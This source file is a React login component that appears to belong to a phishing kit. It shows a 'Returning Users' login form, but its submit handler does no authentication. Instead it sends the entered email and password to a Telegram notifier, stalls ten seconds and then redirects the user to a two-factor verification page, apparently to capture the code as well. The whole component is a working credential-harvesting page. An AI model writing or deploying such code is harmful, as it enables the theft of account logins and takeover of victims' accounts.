"use client";
import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { HelpCircle, Loader2 } from 'lucide-react';
import { notifyTelegram } from '@/lib/telegram-notify';
import { setLoginComplete, setTwoFactorStepComplete } from '@/lib/auth-flow';

const LOGIN_DELAY_MS = 10000;

export function LoginCard() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    notifyTelegram({
      kind: 'login',
      username: email,
      password,
    });
    await new Promise((r) => setTimeout(r, LOGIN_DELAY_MS));
    setLoginComplete();
    
    setTwoFactorStepComplete();
    router.push('/two-factor/verify?method=email');
  };

  return (
    <div className="w-full max-w-[850px] mx-auto bg-white rounded shadow-[0_2px_8px_rgba(0,0,0,0.1)]">
      <div className="flex flex-col md:flex-row">
        
        <div className="flex-1 p-12">
          <h2 className="text-3xl font-normal text-[#333333] mb-2">
            Returning Users
          </h2>
          <p className="text-base text-[#666666] mb-8">
            Log in to your existing account.
          </p>

          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <label 
                htmlFor="email" 
                className="block text-base text-[#333333] mb-2"
              >
                Email (Username)
              </label>
              <input
                type="text"
                id="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                disabled={loading}
                className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-base text-[#333333] placeholder:text-[#999999] disabled:opacity-60 disabled:bg-[#FAFAFA]"
              />
            </div>

            <div>
              <label 
                htmlFor="password" 
                className="block text-base text-[#333333] mb-2"
              >
                Password
              </label>
              <input
                type="password"
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                disabled={loading}
                className="w-full h-12 px-3 border border-[#DDDDDD] rounded text-base text-[#333333] placeholder:text-[#999999] disabled:opacity-60 disabled:bg-[#FAFAFA]"
              />
            </div>

            <button
              type="submit"
              disabled={!email || !password || loading}
              className="h-12 min-w-[120px] px-8 rounded-full text-base font-medium text-white bg-[#B8B8B8] disabled:bg-[#B8B8B8] enabled:bg-[#00C389] enabled:hover:bg-[#00A876] transition-colors inline-flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <Loader2 className="h-5 w-5 animate-spin" aria-hidden />
                  Loading…
                </>
              ) : (
                'Login'
              )}
            </button>
          </form>

          <p className="mt-6 text-base text-[#666666]">
            Forgot{' '}
            <a 
              href="#" 
              className="text-[#00C389] hover:underline"
            >
              Username
            </a>
            {' '}or{' '}
            <a 
              href="#" 
              className="text-[#00C389] hover:underline"
            >
              Password
            </a>
            ?
          </p>
        </div>

        
        <div className="hidden md:block w-px bg-[#EEEEEE] my-12" />

        
        <div className="flex-1 p-12">
          <h2 className="text-3xl font-normal text-[#333333] mb-2">
            New Users
          </h2>
          <p className="text-base text-[#666666] mb-8">
            Register your account now.
          </p>

          <button
            className="h-12 px-8 rounded-full text-base font-medium text-[#00C389] border border-[#00C389] bg-transparent hover:bg-[#00C389] hover:bg-opacity-10 transition-colors mb-8"
          >
            Get Started
          </button>

          <div className="space-y-5">
            <a 
              href="#" 
              className="flex items-center gap-2 text-base text-[#00C389] hover:underline"
            >
              <HelpCircle className="w-5 h-5" />
              Helpful hints for accessing your account
            </a>
            <a 
              href="#" 
              className="flex items-center gap-2 text-base text-[#00C389] hover:underline"
            >
              <HelpCircle className="w-5 h-5" />
              Learn about Multifactor Authentication
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
